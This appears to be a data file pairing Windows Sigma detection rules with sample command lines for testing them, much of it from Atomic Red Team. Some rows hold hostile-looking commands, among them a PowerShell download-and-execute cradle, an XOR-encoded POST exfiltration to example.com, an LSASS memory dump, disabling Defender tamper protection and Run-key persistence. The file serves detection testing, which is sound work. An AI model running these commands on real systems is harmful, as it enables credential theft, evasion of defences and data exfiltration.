Rule_name	Title	Rule_id	Command_match_rule
proc_creation_win_susp_download_office_domain	Suspicious Download from Office Domain	00d49ed5-4491-4271-a8db-650a4ef6f8c1	"powershell.exe" & {cmd.exe /c \""wmic csproduct get UUID\"" cmd.exe /c \""fsutil behavior set SymlinkEvaluation R2L:1\"" cmd.exe /c \""fsutil behavior set SymlinkEvaluation R2R:1\"" reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f copy \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe\"" $env:temp cmd.exe /c \""$env:temp\psexec.exe -accepteula \\$ENV:COMPUTERNAME cmd.exe /c echo \""--access-token\""\""}
proc_creation_win_net_use_password_plaintext	Password Provided In Command Line Of Net.EXE	d4498716-1d52-438f-8084-4a603157d131	net use \192.0.2.10\share /USER:domain\user password
			
proc_creation_win_remote_access_tools_screenconnect_installation_cli_param	Remote Access Tool - ScreenConnect Installation Execution	75bfe6e6-cd8e-429e-91d3-03921e1d7962	
proc_creation_win_remote_access_tools_teamviewer_incoming_connection	Remote Access Tool - Team Viewer Session Started On Windows Host	ab70c354-d9ac-4e11-bbb6-ec8e3b153357	"C:\Program Files\TeamViewer\TeamViewer_Desktop.exe" --IPCport 5939 --Module 1
			
proc_creation_win_mssql_susp_child_process	Suspicious Child Process Of SQL Server	869b9ca7-9ea2-4a5a-8325-e80e62f75445	
proc_creation_win_webshell_susp_process_spawned_from_webserver	Suspicious Process By Web Server Process	8202070f-edeb-4d31-a010-a26c72ac5600	reg.exe query HKLM\SOFTWARE
			
proc_creation_win_susp_arbitrary_shell_execution_via_settingcontent	Arbitrary Shell Command Execution Via Settingcontent-Ms	24de4f3b-804c-4165-b442-5a06a2302c7e	"C:\Windows\explorer.exe" "C:\Users\Public\SettingsShortcut.SettingContent-ms"
proc_creation_win_susp_arbitrary_shell_execution_via_settingcontent	Arbitrary Shell Command Execution Via Settingcontent-Ms	24de4f3b-804c-4165-b442-5a06a2302c7e	
proc_creation_win_susp_double_extension	Suspicious Double Extension File Execution	1cdd9a09-06c9-4769-99ff-626e2b3991b8	C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.docx.exe

proc_creation_win_rundll32_without_parameters	Rundll32 Execution Without Parameters	5bb68627-3198-40ca-b458-49f973db8752	"C:\Windows\System32\rundll32.exe"
			
proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd	C:\WINDOWS\system32\mmc.exe -Embedding
			
proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9	"powershell.exe" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\""Path\n----\nC:\Users\victim\"")) $key = \""abcdefghijklmnopqrstuvwxyz123456\"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i %% $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}
			
			
			
			
			
proc_creation_win_autorun_registry_modified_via_wmic	Suspicious Autorun Registry Modified via WMI	c80e66d8-1780-48a9-b412-46663fd21ac0	powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\malware.exe" /f'
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	C:\Tools\crackmapexec.exe smb 192.0.2.10
proc_creation_win_wmic_susp_process_creation	Suspicious Process Created Via Wmic.EXE	3c89a1e8-0fba-449e-8f1b-8409d6267ec8	wmic process call create "cmd.exe /c echo test > C:\Temp\test.txt"
proc_creation_win_wmiprvse_susp_child_processes	Suspicious WmiPrvSE Child Process	8a582fe2-0882-4b89-a82a-da6b2dc32937	regsvr32.exe /s C:\Temp\test.dll
			
proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7	C:\Tools\bcp.exe TestDB.dbo.TestTable out C:\Temp\test.txt -c -T
			
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	C:\Tools\crackmapexec.exe smb 192.0.2.10
			
proc_creation_win_schtasks_creation	Scheduled Task Creation Via Schtasks.EXE	92626ddd-662c-49e3-ac59-f6535f12d189	SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST 20:10
proc_creation_win_schtasks_creation_temp_folder	Suspicious Scheduled Task Creation Involving Temp Folder	39019a4e-317f-4ce3-ae63-309a8c6b53c5	schtasks.exe /create /tn "TestTask1" /tr "C:\Windows\Temp\test.txt" /sc once /st 12:00
proc_creation_win_schtasks_env_folder	Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE	81325ce1-be01-4250-944f-b4789644556f	schtasks.exe /create /tn "TestTask1" /tr "C:\Perflogs\test.txt" /sc daily
proc_creation_win_schtasks_openssh_tunnelling	Potential SSH Tunnel Persistence Install Using A Scheduled Task	2daa93a0-a5fb-41c5-8cd8-3c11294bfd1f	schtasks.exe /create /tn "TestTask1" /tr "C:\Windows\System32\OpenSSH\ssh.exe -i C:\Temp\test.txt user@192.0.2.10" /sc daily
proc_creation_win_schtasks_schedule_type	Suspicious Schtasks Schedule Types	24c8392b-aa3c-46b7-a545-43f71657fe98	SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
			
proc_creation_win_fsutil_symlinkevaluation	Fsutil Behavior Set SymlinkEvaluation	c0b2768a-dd06-4671-8339-b16ca8d1f27f	fsutil behavior set SymlinkEvaluation R2L:1
proc_creation_win_hktl_sliver_c2_execution_pattern	HackTool - Sliver C2 Implant Activity Pattern	42333b2c-b425-441c-b70e-99404a17170f	powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8
proc_creation_win_perl_inline_command_execution	Perl Inline Command Execution	f426547a-e0f7-441a-b63e-854ac5bdf54d	 C:\Strawberry\perl\bin\perl.exe -e "print 'TEST-HOST'"
proc_creation_win_powershell_download_iex	PowerShell Download and Execution Cradles	85b0b087-eddf-4a2b-b033-d771fa2b9775	"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps11'); Get-DomainGPO"
proc_creation_win_pua_wsudo_susp_execution	PUA - Wsudo Suspicious Execution	bdeeabc9-ff2a-4a51-be59-bb253aac7891	
proc_creation_win_rar_susp_greedy_compression	Suspicious Greedy Compression Using Rar.EXE	afe52666-401e-4a02-b4ff-5d128990b8cb	C:\Windows\System32\tar.exe -cf C:\Temp\test.tar C:\Temp\test.txt
proc_creation_win_susp_elevated_system_shell_uncommon_parent	Elevated System Shell Spawned From Uncommon Parent Location	178e615d-e666-498b-9630-9ed363038101	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command echo TEST-HOST
proc_creation_win_susp_execution_from_public_folder_as_parent	Potentially Suspicious Execution From Parent Process In Public Folder	69bd9b97-2be2-41b6-9816-fb08757a4d1a	C:\Windows\System32\bitsadmin.exe /transfer TestJob /download /priority foreground http://example.com/test.txt C:\Temp\test.txt
proc_creation_win_vmware_toolbox_cmd_persistence	Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script	7aa4e81a-a65c-4e10-9f81-b200eb229d7d	
proc_creation_win_vmware_toolbox_cmd_persistence_susp	Suspicious Persistence Via VMwareToolBoxCmd.EXE VM State Change Script	236d8e89-ed95-4789-a982-36f4643738ba	
proc_creation_win_winget_local_install_via_manifest	Install New Package Via Winget Local Manifest	313d6012-51a0-4d93-8dfc-de8553239e25	winget.exe install -m C:\Temp\test.yaml
proc_creation_win_winget_local_install_via_manifest	Install New Package Via Winget Local Manifest	313d6012-51a0-4d93-8dfc-de8553239e25	winget.exe install --manifest C:\Temp\test.yaml
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	C:\Tools\crackmapexec.exe smb 192.0.2.10
proc_creation_win_powershell_base64_encoded_cmd	Suspicious Encoded PowerShell Command Line	ca2092a1-c273-4878-9b4b-0d60115bf5ea	powershell.exe -encodedcommand SQBFAFgA
proc_creation_win_powershell_dsinternals_cmdlets	DSInternals Suspicious PowerShell Cmdlets	43d91656-a9b2-4541-b7e2-6a9bd3a13f4e	powershell.exe -Command "Get-ADReplAccount -All -Server $ENV:LOGONSERVER.TrimStart('\')"
proc_creation_win_powershell_reverse_shell_connection	Potential Powershell ReverseShell Connection	edc2f8ae-2412-4dfd-b9d5-0c57727e70be	
proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695	
proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9	
proc_creation_win_susp_data_exfiltration_via_cli	Potential Data Exfiltration Activity Via CommandLine Tools	7d1aaf3d-4304-425c-b7c3-162055e0b3ab	
			
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	
proc_creation_win_pua_advancedrun	PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84	

proc_creation_win_susp_add_user_remote_desktop_group	User Added to Remote Desktop Users Group	ffa28e60-bdb1-46e0-9f82-05f7a61cc06e	net localgroup "Remote Desktop Users" TEST-HOST /add
proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb	
proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb	
proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21	
			
proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb	
proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb	
proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
			
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_hacking	Webshell Hacking Activity Patterns	4ebc877f-4612-45cb-b3a5-8e3834db36c9	
proc_creation_win_webshell_recon_commands_and_processes	Webshell Detection With Command Line Keywords	bed2a484-9348-4143-8a8a-b801c979301c	
proc_creation_win_mssql_susp_child_process	Suspicious Child Process Of SQL Server	869b9ca7-9ea2-4a5a-8325-e80e62f75445	
			
proc_creation_win_susp_velociraptor_child_process	Suspicious Velociraptor Child Process	4bc90587-e6ca-4b41-be0b-ed4d04e4ed0c	powershell.exe -Command IWR -Uri http://example.com/test.txt -OutFile C:\Temp\test.txt

proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	
			
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	
			
			
proc_creation_win_schtasks_creation	Scheduled Task Creation Via Schtasks.EXE	92626ddd-662c-49e3-ac59-f6535f12d189	
			
proc_creation_win_hktl_coercedpotato	HackTool - CoercedPotato Execution	e8d34729-86a4-4140-adfd-0a29c2106307	
			
			
proc_creation_win_pua_wsudo_susp_execution	PUA - Wsudo Suspicious Execution	bdeeabc9-ff2a-4a51-be59-bb253aac7891	
proc_creation_win_susp_elevated_system_shell_uncommon_parent	Elevated System Shell Spawned From Uncommon Parent Location	178e615d-e666-498b-9630-9ed363038101	
			
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	
			
proc_creation_win_hktl_crackmapexec_execution	HackTool - CrackMapExec Execution	42a993dd-bb3e-48c8-b372-4d6684c4106c	
proc_creation_win_pua_advancedrun	PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84	
			
			
proc_creation_win_net_use_password_plaintext	Password Provided In Command Line Of Net.EXE	d4498716-1d52-438f-8084-4a603157d131	net use \192.0.2.10\share /USER:domain\user password
			
proc_creation_win_secedit_execution	Potential Suspicious Activity Using SeCEdit	c2c76b77-32be-4d1f-82c9-7e544bdfe0eb	

Potential Adplus.EXE Abuse	2f869d59-7f6a-4931-992c-cce556ff2d53		
Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		
CreateDump Process Dump	515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48	"C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe" -u -f C:\Users\thaim\AppData\Local\Temp\dotnet-lsass.dmp 788	
DumpMinitool Execution	dee0a7a3-f200-4112-a99b-952196d81e42		
			
			
			
Password Provided In Command Line Of Net.EXE	d4498716-1d52-438f-8084-4a603157d131		
			
Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		
Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		
			
Findstr Launching .lnk File	33339be3-148b-4e16-af56-ad16ec6c7e7b	findstr.exe TEST-HOST C:\Temp\test.lnk	
			
			
			
			
			
Suspicious CodePage Switch Via CHCP	c7942406-33dd-4377-a564-0f62db0593a3	chcp.com 936	
CreateDump Process Dump	515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48		
DumpMinitool Execution	dee0a7a3-f200-4112-a99b-952196d81e42		
Findstr Launching .lnk File	33339be3-148b-4e16-af56-ad16ec6c7e7b		
Forfiles.EXE Child Process Masquerading	f53714ec-5077-420e-ad20-907ff9bb2958		
CodePage Modification Via MODE.COM To Russian Language	12fbff88-16b5-4b42-9754-cd001a789fb3		
Renamed Plink Execution	1c12727d-02bf-45ff-a9f3-d49806a3cf43		
			
Potential Defense Evasion Via Right-to-Left Override	ad691d92-15f2-4181-9aa4-723c74f9ddc3	powershell.exe -Command "Write-Output 'TEST-HOST '	
			
Renamed ProcDump Execution	4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67		
Suspicious Copy From or To System Directory	fff9d2b7-e11c-4a69-93d3-40ef66189767	"cmd.exe" /c copy "C:\AtomicRedTeam\atomics\T1543.003\bin\w64time.dll" %%systemroot%%\system32\ & sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto & sc config W64Time DisplayName= "Windows 64 Time" & sc description W64Time "Maintain date and time synch on all clients and services in the network" & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f & reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%%systemroot%%\system32\w64time.dll" /f & sc start W64Time	
			
			
			
Suspicious WmiPrvSE Child Process	8a582fe2-0882-4b89-a82a-da6b2dc32937		
			
			
Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9	dllhost.exe	
HackTool - CoercedPotato Execution	e8d34729-86a4-4140-adfd-0a29c2106307		
HackTool - DInjector PowerShell Cradle Execution	d78b5d61-187d-44b6-bf02-93486a80de5a		
			
Potential DLL Injection Or Execution Using Tracker.exe	148431ce-4b70-403d-8525-fcc2993f29ea		
			
Elevated System Shell Spawned From Uncommon Parent Location	178e615d-e666-498b-9630-9ed363038101		
Potentially Suspicious Execution From Parent Process In Public Folder	69bd9b97-2be2-41b6-9816-fb08757a4d1a		
Install New Package Via Winget Local Manifest	313d6012-51a0-4d93-8dfc-de8553239e25	winget.exe install --manifest C:\Temp\test.yaml	
			
Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		
			
PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84		
			
			
			
ETW Trace Evasion Activity	a238b5d0-ce2d-4414-a676-7a531b3d13d6	wevtutil.exe set-log TEST-HOST /e:false	
			
			
			
Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	C:\WINDOWS\system32\net1 share ADMIN$ /delete	
			
			
Password Provided In Command Line Of Net.EXE	d4498716-1d52-438f-8084-4a603157d131		
			
Potential Suspicious Activity Using SeCEdit	c2c76b77-32be-4d1f-82c9-7e544bdfe0eb	secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt	
			
New Port Forwarding Rule Added Via Netsh.EXE	322ed9ec-fcab-4f67-9a34-e7c6aef43614	"C:\WINDOWS\system32\netsh.exe" interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1	
RDP Port Forwarding Rule Added Via Netsh.EXE	782d6f3e-4c5d-4b8c-92a3-1d05fed72e63	netsh.exe interface portproxy add v4tov4 listenport=3389 listenaddress=192.0.2.10 connectport=3389 connectaddress=192.0.2.10	
			
Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	findstr.exe /v /l "TEST-HOST" \example.com\share\test.txt	
Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		
PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		
File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5	"cmd.exe" /c cd "%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt	
MsiExec Web Install	f7b5f842-a6af-4da5-9e95-e32478f3cd2f	msiexec.exe /i http://example.com/test.msi	
			
Potential Binary Proxy Execution Via Cdb.EXE	b5c7395f-e501-4a08-94d4-57fe7a9da9d2	"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe" -c ".shell cmd /c echo test > C:\Temp\test.txt;q" notepad.exe	
			
New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		
Potentially Suspicious Desktop Background Change Using Reg.EXE	8cbc9475-8d05-4e27-9c32-df960716c701	reg.exe add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Temp\test.jpg" /f	
Potential Suspicious Registry File Imported Via Reg.EXE	62e0298b-e994-4189-bc87-bc699aa62d97	reg.exe import C:\Users\Public\test.reg	
Enable LM Hash Storage - ProcCreation	98dedfdd-8333-49d4-9f23-d7018cccae53	reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v NoLMHash /t REG_DWORD /d 0 /f	
Reg Add Suspicious Paths	b7e2a8d4-74bb-4b78-adc9-3f92af2d4829	reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f	
ShimCache Flush	b0524451-19af-4efa-a46f-562a977f792e		
Non-privileged Usage of Reg or Powershell	8f02c935-effe-45b3-8fc9-ef8696a9e41d	reg.exe add "HKLM\System\CurrentControlSet\Services\TEST-HOST" /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\test.txt" /f	
Suspicious VBoxDrvInst.exe Parameters	b7b19cb6-9b32-4fc4-a108-73f19acfe262		
			
Potential Binary Proxy Execution Via Cdb.EXE	b5c7395f-e501-4a08-94d4-57fe7a9da9d2		
Kavremover Dropped Binary LOLBIN Usage	d047726b-c71c-4048-a99b-2e2f50dc107d		
Use of VSIISExeLauncher.exe	18749301-f1c5-4efc-a4c3-276ff1f5b6f8		
Potential Arbitrary Code Execution Via Node.EXE	6640f31c-01ad-49b5-beb5-83498a5cd8bd		
			
			
HackTool - Impersonate Execution	cf0c254b-22f1-4b2b-8221-e137b3c0af94		
HackTool - SharpDPAPI Execution	c7d33b50-f690-4b51-8cfb-0fb912a31e57		
HackTool - SharpImpersonation Execution	f89b08d0-77ad-4728-817b-9b16c5a69c7a		
			
PUA - AdvancedRun Execution	d2b749ee-4225-417e-b20e-a8d2193cbb84		
PUA - AdvancedRun Suspicious Execution	fa00b701-44c6-4679-994d-5a18afa8a707		
			
HackTool - Impersonate Execution	cf0c254b-22f1-4b2b-8221-e137b3c0af94		
HackTool - SharpDPAPI Execution	c7d33b50-f690-4b51-8cfb-0fb912a31e57		
HackTool - SharpImpersonation Execution	f89b08d0-77ad-4728-817b-9b16c5a69c7a		
			
HackTool - PPID Spoofing SelectMyParent Tool Execution	52ff7941-8211-46f9-84f8-9903efb7077d		
			
Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		
Potential Commandline Obfuscation Using Escape Characters	f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd		
			
Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	
			
Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b	C:\Users\thaim\AppData\Local\Microsoft\WindowsApps\bash.exe C:\Temp\test.sh	
Findstr Launching .lnk File	33339be3-148b-4e16-af56-ad16ec6c7e7b		
Potential Arbitrary Command Execution Using Msdt.EXE	258fc8ce-8352-443a-9120-8a11e4857fa5	msdt.exe /id PCWDiagnostic /skip true /param "IT_BrowseForFile=echo TEST-HOST"	
Suspicious Cabinet File Execution Via Msdt.EXE	dc4576d4-7467-424f-9eee-fd2b02855fe0	msdt.exe -cab C:\Temp\test.cab	
Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		
Rundll32 Execution Without CommandLine Parameters	1775e15e-b61b-4d14-a1a3-80981298085a	C:\Windows\System32\rundll32.exe	
			
